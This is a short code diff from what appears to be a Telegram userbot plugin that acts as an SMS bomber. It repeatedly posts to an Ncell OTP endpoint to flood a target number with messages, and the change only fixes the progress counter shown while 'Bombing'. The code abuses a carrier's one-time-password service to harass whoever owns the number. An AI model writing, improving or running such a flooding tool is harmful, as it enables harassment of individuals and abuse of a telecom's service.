@@ -21,7 +21,7 @@ async def _(event):
             sleep(1)
         else:
             requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
-            await event.edit(f"`Bombing... {n}`")
+            await event.edit(f"`Bombing... {i}`")
     await event.edit(f"`Bombed {n} SMS to {num}`")
 
     
